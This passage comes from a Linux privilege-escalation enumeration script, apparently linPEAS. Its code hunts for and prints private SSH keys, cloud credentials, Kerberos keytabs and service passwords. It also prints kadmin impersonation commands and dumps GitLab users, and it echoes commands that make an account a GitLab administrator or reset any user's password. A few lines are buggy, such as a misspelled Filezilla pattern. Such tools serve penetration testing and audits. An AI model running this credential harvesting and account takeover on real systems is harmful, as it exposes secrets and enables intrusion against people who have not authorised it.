  clientcert=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_MNT $FIND_USR $FIND_OPT $FIND_PRIVATE $FIND_APPLICATIONS" | grep -E '.*\.pfx|.*\.p12' | grep -E -v '^/usr/share/.*' | grep -E -v '^/etc/ssl/.*' | grep -E -v '^/usr/local/lib/.*' | grep -E -v '^/usr/lib/.*')
  sshagents=$(echo "$FIND_TMP" | grep -E 'agent.*')
  homesshconfig=$(echo "$FIND_HOME $FIND_USR" | grep -E 'config' | grep "ssh")
  sshconfig="`ls /etc/ssh/ssh_config 2>/dev/null`"
  hostsdenied="`ls /etc/hosts.denied 2>/dev/null`"
  hostsallow="`ls /etc/hosts.allow 2>/dev/null`"

  if [ "$ssh"  ]; then
    printf "$ssh\n"
  fi

  grep "PermitRootLogin \|ChallengeResponseAuthentication \|PasswordAuthentication \|UsePAM \|Port\|PermitEmptyPasswords\|PubkeyAuthentication\|ListenAddress\|ForwardAgent\|AllowAgentForwarding\|AuthorizedKeysFiles" /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | sed -${E} "s,PermitRootLogin.*es|PermitEmptyPasswords.*es|ChallengeResponseAuthentication.*es|FordwardAgent.*es,${C}[1;31m&${C}[0m,"

  if [ "$TIMEOUT" ]; then
    privatekeyfilesetc=`timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /etc 2>/dev/null`
    privatekeyfileshome=`timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' $HOMESEARCH 2>/dev/null`
    privatekeyfilesroot=`timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /root 2>/dev/null`
    privatekeyfilesmnt=`timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /mnt 2>/dev/null`
  else
    privatekeyfilesetc=`grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /etc 2>/dev/null` #If there is tons of files linpeas gets frozen here without a timeout
    privatekeyfileshome=`grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' $HOME/.ssh 2>/dev/null`
  fi
    
  if [ "$privatekeyfilesetc" ] || [ "$privatekeyfileshome" ] || [ "$privatekeyfilesroot" ] || [ "$privatekeyfilesmnt" ] ; then
    printf "Possible private SSH keys were found!\n" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
    if [ "$privatekeyfilesetc" ]; then printf "$privatekeyfilesetc\n" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"; fi
    if [ "$privatekeyfileshome" ]; then printf "$privatekeyfileshome\n" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"; fi
    if [ "$privatekeyfilesroot" ]; then printf "$privatekeyfilesroot\n" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"; fi
    if [ "$privatekeyfilesmnt" ]; then printf "$privatekeyfilesmnt\n" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"; fi
  fi
  if [ "$certsb4_grep" ] || [ "$certsbin" ]; then
    echo "  --> Some certificates were found (out limited):"
    printf "$certsb4_grep\n" | head -n 20
    printf "$certsbin\n" | head -n 20
  fi
  if [ "$clientcert" ]; then
    echo "  --> Some client certificates were found:"
    printf "$clientcert\n"
  fi
  if [ "$sshagents" ]; then
    echo "  --> Some SSH Agent files were found:"
    printf "$sshagents\n"
  fi
  if [ "`ssh-add -l 2>/dev/null | grep -v 'no identities'`" ]; then
    echo "  --> SSH Agents listed:"
    ssh-add -l
  fi
  if [ "$homesshconfig" ]; then
    echo " --> Some home ssh config file was found"
    printf "$homesshconfig\n"
    printf "$homesshconfig\n" | while read f; do cat "$f" 2>/dev/null | grep -v "^$" | sed -${E} "s,User|ProxyCommand,${C}[1;31m&${C}[0m,"; done
  fi
  if [ "$hostsdenied" ]; then
    echo " --> /etc/hosts.denied file found, read the rules:"
    printf "$hostsdenied\n"
    cat "/etc/hosts.denied" 2>/dev/null | grep -v "#" | grep -v "^$" | sed -${E} "s,.*,${C}[1;32m&${C}[0m,"
    echo ""
  fi
  if [ "$hostsallow" ]; then
    echo " --> /etc/hosts.allow file found, read the rules:"
    printf "$hostsallow\n"
    cat "/etc/hosts.allow" 2>/dev/null | grep -v "#" | grep -v "^$" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
    echo ""
  fi
  if [ "$sshconfig" ]; then
    echo ""
    echo "Searching inside /etc/ssh/ssh_config for interesting info"
    cat /etc/ssh/ssh_config 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null | grep -v "^$" | sed -${E} "s,Host|ForwardAgent|User|ProxyCommand,${C}[1;31m&${C}[0m,"
  fi
  echo ""

  #-- SI) PAM auth
  printf $Y"[+] "$GREEN"Searching unexpected auth lines in /etc/pam.d/sshd\n"$NC
  pamssh=`cat /etc/pam.d/sshd 2>/dev/null | grep -v "^#\|^@" | grep -i auth`
  if [ "$pamssh" ]; then
    cat /etc/pam.d/sshd 2>/dev/null | grep -v "^#\|^@" | grep -i auth | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi
  echo ""

  #-- SI) Cloud keys
  printf $Y"[+] "$GREEN"Searching Cloud credentials (AWS, Azure, GC)\n"$NC
  cloudcreds=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'credentials$|credentials\.db$|legacy_credentials\.db$|access_tokens\.db$|accessTokens\.json$|azureProfile\.json$')
  if [ "$cloudcreds" ]; then
    printf "$cloudcreds\n" | while read f; do 
      if [ -f "$f" ]; then #Check if file, here we only look for filenames, not dirs
        printf "Trying to read $f\n" | sed -${E} "s,credentials|credentials.db|legacy_credentials.db|access_tokens.db|accessTokens.json|azureProfile.json,${C}[1;31m&${C}[0m,g"
        if [ -r "$f" ]; then
          cat "$f" 2>/dev/null | sed -${E} "s,.*,${C}[1;31m&${C}[0m,g"
        fi
        echo ""
      fi
    done
  fi
  echo ""

  #-- SI) NFS exports
  printf $Y"[+] "$GREEN"NFS exports?\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe\n"$NC
  if [ "`cat /etc/exports 2>/dev/null`" ]; then cat /etc/exports 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null | sed -${E} "s,no_root_squash|no_all_squash ,${C}[1;31;103m&${C}[0m," | sed -${E} "s,insecure,${C}[1;31m&${C}[0m,"
  else echo_not_found "/etc/exports"
  fi
  echo ""

  #-- SI) Kerberos
  printf $Y"[+] "$GREEN"Searching kerberos conf files and tickets\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt\n"$NC
  kadmin_exists="`command -v kadmin`"
  klist_exists="`command -v klist`"
  if [ "$kadmin_exists" ]; then echo "kadmin was found on $kadmin_exists" | sed "s,$kadmin_exists,${C}[1;31m&${C}[0m,"; fi
  if [ "$klist_exists" ] && [ -x "$klist_exists" ]; then echo "klist execution"; klist; fi
  
  krb5=$(echo "$FIND_DIR_VAR\n$FIND_DIR_ETC\n$FIND_DIR_HOME\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_USERS\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_MNT" | grep -E 'krb5\.conf|krb5.keytab|\.k5login')
  printf "$krb5\n" | while read f; do
    if [ -r "$f" ]; then
      if [ "`echo \"$f\" | grep .k5login`" ]; then
        echo ".k5login file (users with access to the user who has this file in his home)"
        cat "$f" 2>/dev/null | sed -${E} "s,.*,${C}[1;31m&${C}[0m,g"
      elif [ "`echo \"$f\" | grep keytab`" ]; then
        echo ""
        echo "keytab file found, you may be able to impersonate some kerberos principals and add users or modify passwords"
        klist -k "$f" 2>/dev/null | sed -${E} "s,.*,${C}[1;31m&${C}[0m,g"
        printf "`klist -k \"$f\" 2>/dev/null`\n" | awk '{print $2}' | while read l; do
          if [ "$l" ] && [ "`echo \"$l\" | grep \"@\"`"  ]; then
            printf "$ITALIC  --- Impersonation command: ${NC}kadmin -k -t /etc/krb5.keytab -p \"$l\"\n" | sed -${E} "s,$l,${C}[1;31m&${C}[0m,g"
            #kadmin -k -t /etc/krb5.keytab -p "$l" -q getprivs 2>/dev/null #This should show the permissions of each impersoanted user, the thing is that in a test it showed that every user had the same permissions (even if they didn't). So this test isn't valid
            #We could also try to create a new user or modify a password, but I'm not user if linpeas should do that
          fi
        done
      elif [ "`echo \"$f\" | grep krb5.conf`" ]; then
        ls -l "$f"
        cat "$f" 2>/dev/null | grep default_ccache_name | sed -${E} "s,default_ccache_name,${C}[1;31m&${C}[0m,"; 
      elif [ "`echo \"$f\" | grep kadm5.acl`" ]; then
        ls -l "$f"
        cat "$f" 2>/dev/null
      fi
    fi
  done
  ls -l "/tmp/krb5cc*" "/var/lib/sss/db/ccache_*" "/etc/opt/quest/vas/host.keytab" 2>/dev/null || echo_not_found "tickets kerberos"
  klist 2>/dev/null || echo_not_found "klist"
  echo ""

  #-- SI) kibana
  printf $Y"[+] "$GREEN"Searching Kibana yaml\n"$NC
  kibana=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'kibana\.y.*ml')
  if [ "$kibana" ]; then
    printf "$kibana\n"
    printf "$kibana\n" | while read f; do
      if [ -r "$f" ]; then
        cat "$f" 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null | grep -v "^$" | grep -v -e '^[[:space:]]*$' | sed -${E} "s,username|password|host|port|elasticsearch|ssl,${C}[1;31m&${C}[0m,"; 
      fi
    done
  else echo_not_found "kibana.yml"
  fi
  echo ""

  #-- SI) Knock
  printf $Y"[+] "$GREEN"Searching Knock configuration\n"$NC
  Knock=$(echo "$FIND_ETC\n$FIND_MNT" | grep -E '/etc/init.d/.*knockd.*')
  if [ "$Knock" ]; then
    printf "$Knock\n" | while read f; do
      h=$(grep -R -i "defaults_file=" $f | cut -b 15-) ##Search string to know where is the default knock file - example - DEFAULTS_FILE=/etc/default/knockd
      i=$(grep -R -i "please edit" $h | awk '{print $4}') ##Search string to know where is config file - example - # PLEASE EDIT /etc/knockd.conf BEFORE ENABLING
      j=$(grep -R -i "sequence" $i) ##If we want we can show sequence number - 'hidded'
      printf "Config Knock file found!: \n$i\n" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
      printf " Sequence found!: \n$j\n" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
    done
  else echo_not_found "Knock.config"
  fi
  echo ""

  ##-- SI) Logstash
  printf $Y"[+] "$GREEN"Searching logstash files\n"$NC
  logstash=$(echo "$FIND_DIR_VAR\n$FIND_DIR_ETC\n$FIND_DIR_HOME\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_USERS\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_MNT" | grep -E 'logstash')
  if [ "$logstash" ]; then
    printf "$logstash\n"
    printf "$logstash\n" | while read d; do
      if [ -r "$d/startup.options" ]; then 
        echo "Logstash is running as user:"
        cat "$d/startup.options" 2>/dev/null | grep "LS_USER\|LS_GROUP" | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed -${E} "s,$USER,${C}[1;95m&${C}[0m," | sed -${E} "s,root,${C}[1;31m&${C}[0m,"
      fi
      cat "$d/conf.d/out*" | grep "exec\s*{\|command\s*=>" | sed -${E} "s,exec\W*\{|command\W*=>,${C}[1;31m&${C}[0m,"
      cat "$d/conf.d/filt*" | grep "path\s*=>\|code\s*=>\|ruby\s*{" | sed -${E} "s,path\W*=>|code\W*=>|ruby\W*\{,${C}[1;31m&${C}[0m,"
    done
  else echo_not_found
  fi
  echo ""

  #-- SI) Elasticsearch
  printf $Y"[+] "$GREEN"Searching elasticsearch files\n"$NC
  elasticsearch=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'elasticsearch\.y.*ml')
  if [ "$elasticsearch" ]; then
    printf "$elasticsearch\n"
    printf "$elasticsearch\n" | while read f; do
      if [ -r "$f" ]; then
        cat $f 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null | grep -v -e '^[[:space:]]*$' | grep "path.data\|path.logs\|cluster.name\|node.name\|network.host\|discovery.zen.ping.unicast.hosts"; 
      fi
    done
    echo "Version: $(curl -X GET '10.10.10.115:9200' 2>/dev/null | grep number | cut -d ':' -f 2)"
  else echo_not_found
  fi
  echo ""

  #-- SI) Vault-ssh
  printf $Y"[+] "$GREEN"Searching Vault-ssh files\n"$NC
  vaultssh=$(echo "$FIND_ETC\n$FIND_USR\n$FIND_HOME\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'vault-ssh-helper\.hcl')
  if [ "$vaultssh" ]; then
    printf "$vaultssh\n"
    printf "$vaultssh\n" | while read f; do cat "$f" 2>/dev/null; vault-ssh-helper -verify-only -config "$f" 2>/dev/null; done
    echo ""
    vault secrets list 2>/dev/null
    echo "$FIND_ETC\n$FIND_HOME\n$FIND_USR\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E '\.vault-token' | sed -${E} "s,.*,${C}[1;31m&${C}[0m," 2>/dev/null
  else echo_not_found "vault-ssh-helper.hcl"
  fi
  echo ""

  #-- SI) Cached AD Hashes
  adhashes=`ls "/var/lib/samba/private/secrets.tdb" "/var/lib/samba/passdb.tdb" "/var/opt/quest/vas/authcache/vas_auth.vdb" "/var/lib/sss/db/cache_*" 2>/dev/null`
  printf $Y"[+] "$GREEN"Searching AD cached hashes\n"$NC
  if [ "$adhashes" ]; then
    ls -l "/var/lib/samba/private/secrets.tdb" "/var/lib/samba/passdb.tdb" "/var/opt/quest/vas/authcache/vas_auth.vdb" "/var/lib/sss/db/cache_*" 2>/dev/null
  else echo_not_found "cached hashes"
  fi
  echo ""

  #-- SI) Screen sessions
  printf $Y"[+] "$GREEN"Searching screen sessions\n"$N
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions\n"$NC
  screensess=`screen -ls 2>/dev/null`
  if [ "$screensess" ]; then
    printf "$screensess" | sed -${E} "s,.*,${C}[1;31m&${C}[0m," | sed -${E} "s,No Sockets found.*,${C}[32m&${C}[0m,"
  else echo_not_found "screen"
  fi
  echo ""

  #-- SI) Tmux sessions
  tmuxdefsess=`tmux ls 2>/dev/null`
  tmuxnondefsess=`ps auxwww | grep "tmux " | grep -v grep`
  printf $Y"[+] "$GREEN"Searching tmux sessions\n"$N
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions\n"$NC
  if [ "$tmuxdefsess" ] || [ "$tmuxnondefsess" ]; then
    printf "$tmuxdefsess\n$tmuxnondefsess\n" | sed -${E} "s,.*,${C}[1;31m&${C}[0m," | sed -${E} "s,no server running on.*,${C}[32m&${C}[0m,"
  else echo_not_found "tmux"
  fi
  echo ""

  #-- SI) Couchdb
  printf $Y"[+] "$GREEN"Searching Couchdb directory\n"$NC
  couchdb_dirs=$(echo "$FIND_DIR_VAR\n$FIND_DIR_ETC\n$FIND_DIR_HOME\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_USERS\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_MNT" | grep -E 'couchdb')
  printf "$couchdb_dirs\n" | while read d; do
    for f in `find $d -name local.ini 2>/dev/null`; do
      if [ -r "$f" ]; then 
        echo "Found readable $f"
        cat "$f" | grep -v "^;" | grep -v "^$" | sed -${E} "s,admin.*|password.*|cert_file.*|key_file.*|hashed.*|pbkdf2.*,${C}[1;31m&${C}[0m," 2>/dev/null
      fi
    done
  done
  echo ""

  #-- SI) Redis
  printf $Y"[+] "$GREEN"Searching redis.conf\n"$NC
  redisconfs=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'redis\.conf$')
  printf "$redisconfs\n" | while read f; do
    if [ -r "$f" ]; then 
      echo "Found readable $f"
      cat "$f" | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null | grep -v "^$" | sed -${E} "s,masterauth.*|requirepass.*,${C}[1;31m&${C}[0m," 2>/dev/null
    fi
  done
  echo ""

  #-- SI) Dovecot
  # Needs testing
  printf $Y"[+] "$GREEN"Searching dovecot files\n"$NC
  dovecotpass=$(grep -r "PLAIN" /etc/dovecot 2>/dev/null)
	if [ -z "$dovecotpass" ]; then 
    echo_not_found "dovecot credentials"
  else
	  for d in $(grep -r "PLAIN" /etc/dovecot 2>/dev/null); do
      df=$(echo $d |cut -d ':' -f1)
      dp=$(echo $d |cut -d ':' -f2-)
      echo "Found possible PLAIN text creds in $df"
      echo "$dp" | sed -${E} "s,.*,${C}[1;31m&${C}[0m," 2>/dev/null
	  done
	fi
  echo ""

  #-- SI) Mosquitto
  printf $Y"[+] "$GREEN"Searching mosquitto.conf\n"$NC
  mqttconfs=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'mosquitto\.conf$')
  printf "$mqttconfs" | while read f; do
    if [ -r "$f" ]; then 
      echo "Found readable $f"
      cat "$f" | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null | grep -v "^$" | sed -${E} "s,password_file.*|psk_file.*|allow_anonymous.*true|auth,${C}[1;31m&${C}[0m," 2>/dev/null
    fi
  done
  echo ""

  #-- SI) Neo4j
  printf $Y"[+] "$GREEN"Searching neo4j auth file\n"$NC
  neo4j=$(echo "$FIND_DIR_VAR\n$FIND_DIR_ETC\n$FIND_DIR_HOME\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_USERS\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_MNT" | grep -E 'neo4j')
  printf "$neo4j\n" | while read d; do
    if [ -r "$d" ]; then 
      echo "Found readable $d"
      find $d -type f -name "auth" -exec cat {} \; 2>/dev/null | sed -${E} "s,.*,${C}[1;31m&${C}[0m," 2>/dev/null
    fi
  done
  echo ""

  #-- SI) Cloud-Init
  printf $Y"[+] "$GREEN"Searching Cloud-Init conf file\n"$NC
  cloudcfg=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'cloud\.cfg$')
  printf "$cloudcfg\n" | while read f; do
    if [ -r "$f" ]; then 
      echo "Found readable $f"
      cat "$f" | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null | grep -v "^$" | grep -E "consumer_key|token_key|token_secret|metadata_url|password:|passwd:|PRIVATE KEY|PRIVATE KEY|encrypted_data_bag_secret|_proxy" | sed -${E} "s,consumer_key|token_key|token_secret|metadata_url|password:|passwd:|PRIVATE KEY|PRIVATE KEY|encrypted_data_bag_secret|_proxy,${C}[1;31m&${C}[0m,"
    fi
  done
  echo ""

  ##-- SI) Erlang
  printf $Y"[+] "$GREEN"Searching Erlang cookie file\n"$NC
  erlangcoo=$(echo "$FIND_ETC\n$FIND_HOME\n$FIND_USR\n$FIND_VAR\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E '.erlang.cookie$')
  printf "$erlangcoo\n" | while read f; do
    if [ -r "$f" ]; then 
      echo "Found Erlang cookie: $f"
      cat "$f" 2>/dev/null | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
    fi
  done
  echo ""

  ##-- SI) GVM
  printf $Y"[+] "$GREEN"Searching GVM auth file\n"$NC
  gvmconfs=$(echo "$FIND_HOME\n$FIND_ETC\n$FIND_TMP\n$FIND_OTP\n$FIND_USR\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'gvm-tools\.conf')
  printf "$gvmconfs\n" | while read f; do
    if [ -r "$f" ]; then 
      echo "Found GVM auth file: $f"
      cat "$f" 2>/dev/null | sed -${E} "s,username.*|password.*,${C}[1;31m&${C}[0m,"
    fi
  done
  echo ""

  ##-- SI) IPSEC
  printf $Y"[+] "$GREEN"Searching IPSEC files\n"$NC
  ipsecconfs=$(echo "$FIND_HOME\n$FIND_ETC\n$FIND_TMP\n$FIND_OTP\n$FIND_USR\n$FIND_PRIVATE\n$FIND_APPLICATIONS\n$FIND_MNT" | grep -E 'ipsec\.secrets|ipsec\.conf')
  printf "$ipsecconfs\n" | while read f; do
    if [ -r "$f" ]; then 
      echo "Found IPSEC file: $f"
      cat "$f" 2>/dev/null | sed -${E} "s,.*PSK.*|.*RSA.*|.*EAP =.*|.*XAUTH.*,${C}[1;31m&${C}[0m,"
    fi
  done
  echo ""

  ##-- SI) IRSSI
  printf $Y"[+] "$GREEN"Searching IRSSI files\n"$NC
  irssifols=$(echo "$FIND_DIR_VAR\n$FIND_DIR_HOME\n$FIND_DIR_ETC\n$FIND_DIR_OTP\n$FIND_DIR_USR\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_MNT" | grep -E '.irssi')
  printf "$irssifols\n" | while read d; do
    if [ -r "$d/config" ]; then 
      echo "Found IRSSI config file: $d/config"
      cat "$d/config" 2>/dev/null | sed -${E} "s,password.*,${C}[1;31m&${C}[0m,"
    fi
  done
  echo ""

  ##-- SI) Keyring
  printf $Y"[+] "$GREEN"Searching Keyring files\n"$NC
  keyringsfilesfolds=$(echo "$FIND_DIR_VAR\n$FIND_DIR_ETC\n$FIND_DIR_HOME\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_USERS\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_HOME\n$FIND_ETC\n$FIND_VAR\n$FIND_MNT\n$FIND_USR\n$FIND_PRIVATE\n$FIND_APPLICATIONS" | grep -E 'keyrings|*\.keyring$|*\.keystore$')
  printf "$keyringsfilesfolds\n" | sort | uniq | while read f; do
    if [ -f "$f" ]; then 
      echo "Keyring file: $f" | sed "s,$f,${C}[1;31m&${C}[0m,"
    elif [ -d "$f" ]; then
      echo "Keyring folder: $f" | sed "s,$f,${C}[1;31m&${C}[0m,"
      ls -lR "$f" 2>/dev/null | sed -${E} "s,keyrings|\.keyring|\.keystore,${C}[1;31m&${C}[0m,"
    fi
  done
  echo ""

  ##-- SI) Filezilla
  printf $Y"[+] "$GREEN"Searching Filezilla sites file\n"$NC
  filezillaconfs=$(echo "$FIND_DIR_VAR\n$FIND_DIR_ETC\n$FIND_DIR_HOME\n$FIND_DIR_OPT\n$FIND_DIR_MNT" | grep -E 'filelliza')
  printf "$filezillaconfs\n" | uniq | while read f; do
    if [ -d "$f" ]; then 
      echo "Found Filezilla folder: $f"
      if [ -f "$f/sitemanager.xml" ]; then
        cat "$f/sitemanager.xml" 2>/dev/null | sed -${E} "s,Host.*|Port.*|Protocol.*|User.*|Pass.*,${C}[1;31m&${C}[0m,"
      fi
    fi
  done
  echo ""

  ##-- SI) BACKUP-MANAGER
  printf $Y"[+] "$GREEN"Searching backup-manager files\n"$NC
  backupmanager=$(echo "$FIND_HOME\n$FIND_ETC\n$FIND_VAR\n$FIND_OPT\n$FIND_MNT\n$FIND_USR\n$FIND_PRIVATE\n$FIND_APPLICATIONS" | grep -E 'storage.php|database.php')
  printf "$backupmanager\n" | sort | uniq | while read f; do
    if [ -f "$f" ]; then 
      echo "backup-manager file: $f" | sed "s,$f,${C}[1;31m&${C}[0m,"
      cat "$f" 2>/dev/null | grep "'pass'|'password'|'user'|'database'|'host'" | sed -${E} "s,password|pass|user|database|host,${C}[1;31m&${C}[0m,"
    fi
  done
  echo ""

  ##-- SI) passwd files (splunk)
  printf $Y"[+] "$GREEN"Searching uncommon passwd files (splunk)\n"$NC
  splunkpwd=$(echo "$FIND_HOME\n$FIND_ETC\n$FIND_VAR\n$FIND_TMP\n$FIND_OPT\n$FIND_USR\n$FIND_MNT\n$FIND_SYSTEM\n$FIND_PRIVATE\n$FIND_APPLICATIONS" | grep -v "/etc/passwd$" | grep -E 'passwd$')
  SPLUNK_BIN="`command -v splunk 2>/dev/null`"
  if [ "$SPLUNK_BIN" ]; then echo "splunk binary was found installed on $SPLUNK_BIN" | sed "s,.*,${C}[1;31m&${C}[0m,"; fi
  printf "$splunkpwd\n" | sort | uniq | while read f; do
    if [ -f "$f" ] && ! [ -x "$f" ]; then 
      echo "passwd file: $f" | sed "s,$f,${C}[1;31m&${C}[0m,"
      cat "$f" 2>/dev/null | grep "'pass'|'password'|'user'|'database'|'host'|\$" | sed -${E} "s,password|pass|user|database|host|\$,${C}[1;31m&${C}[0m,"
    fi
  done
  echo ""

  ##-- SI) Gitlab
  printf $Y"[+] "$GREEN"Searching GitLab related files\n"$NC
  #Check gitlab-rails
  if [ "`command -v gitlab-rails`" ]; then
    echo "gitlab-rails was found. Trying to dump users..."
    gitlab-rails runner 'User.where.not(username: "peasssssssss").each { |u| pp u.attributes }' | sed -${E} "s,email|password,${C}[1;31m&${C}[0m,"
    echo "If you have enough privileges, you can make an account under your control administrator by running: gitlab-rails runner 'user = User.find_by(email: \"youruser@example.com\"); user.admin = TRUE; user.save!'"
    echo "Alternatively, you could change the password of any user by running: gitlab-rails runner 'user = User.find_by(email: \"admin@example.com\"); user.password = \"pass_peass_pass\"; user.password_confirmation = \"pass_peass_pass\"; user.save!'"
    echo ""
  fi
  if [ "`command -v gitlab-backup`" ]; then
    echo "If you have enough privileges, you can create a backup of all the repositories inside gitlab using 'gitlab-backup create'"
    echo "Then you can get the plain-text with something like 'git clone \@hashed/19/23/14348274[...]38749234.bundle'"
    echo ""
  fi
  #Check gitlab files
  gitlabfiles=$(echo "$FIND_HOME\n$FIND_ETC\n$FIND_VAR\n$FIND_TMP\n$FIND_OPT\n$FIND_USR\n$FIND_MNT\n$FIND_SYSTEM\n$FIND_PRIVATE\n$FIND_APPLICATIONS" | grep -v "/lib" | grep -E "secrets.yml$|gitlab.yml$|gitlab.rb$")
  printf "$gitlabfiles\n" | sort | uniq | while read f; do
    if [ "`echo $f | grep secrets.yml`" ]; then
      echo "Found $f" | sed "s,$f,${C}[1;31m&${C}[0m,"
      cat "$f" 2>/dev/null | grep -v "^$" | grep -v "^#"
    elif [ "`echo $f | grep gitlab.yml`" ]; then
      echo "Found $f" | sed "s,$f,${C}[1;31m&${C}[0m,"
      cat "$f" | grep -A 4 "repositories:"
    elif [ "`echo $f | grep gitlab.rb`" ]; then
      echo "Found $f" | sed "s,$f,${C}[1;31m&${C}[0m,"
      cat "$f" | grep -v "^$" | grep -v "^#" | sed -${E} "s,email|user|password,${C}[1;31m&${C}[0m,"
    fi
    echo ""
  done
  echo ""

  ##-- SI) PGP/GPG
  printf $Y"[+] "$GREEN"Searching PGP/GPG\n"$NC
  pgpg=$(echo "$FIND_HOME\n$FIND_PRIVATE\n$FIND_MNT" | grep -E '\.pgp$|\.gpg$|.gnupg')
  if [ "$pgpg" ]; then echo "PGP/GPG files found:" ;
    printf "$pgpg\n" | sort | uniq | while read f; do
      if [ -f "$f" ]; then 
        ls -l "$f"
      else
        ls -ld "$f"
        ls -l "$f" 2>/dev/null
      fi
    done
    echo ""
  fi
  echo "PGP/GPG software:"
  command -v gpg 2>/dev/null || echo_not_found "gpg"
  gpg --list-keys 2>/dev/null
  command -v netpgpkeys 2>/dev/null || echo_not_found "netpgpkeys"
  netpgpkeys --list-keys 2>/dev/null
  command -v netpgp 2>/dev/null || echo_not_found "netpgp"
  echo ""

  ##-- SI) vi swp files
  printf $Y"[+] "$GREEN"Searching vim files\n"$NC
  vimfiles=$(echo "$FIND_HOME\n$FIND_ETC\n$FIND_VAR\n$FIND_TMP\n$FIND_OPT\n$FIND_USR\n$FIND_MNT\n$FIND_SYSTEM\n$FIND_PRIVATE\n$FIND_APPLICATIONS" | grep -E "\.swp$|\.viminfo$")
  printf "$vimfiles\n" | sort | uniq | while read f; do
    ls -l "$f" 2>/dev/null
  done
  echo ""

  ##-- SI) containerd installed
  printf $Y"[+] "$GREEN"Checking if containerd(ctr) is available\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation\n"$NC
  containerd=`command -v ctr`
  if [ "$containerd" ]; then
    echo "ctr was found in $containerd, you may be able to escalate privileges with it" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
    ctr image list
  fi
  echo ""

  ##-- SI) runc installed
  printf $Y"[+] "$GREEN"Checking if runc is available\n"$NC
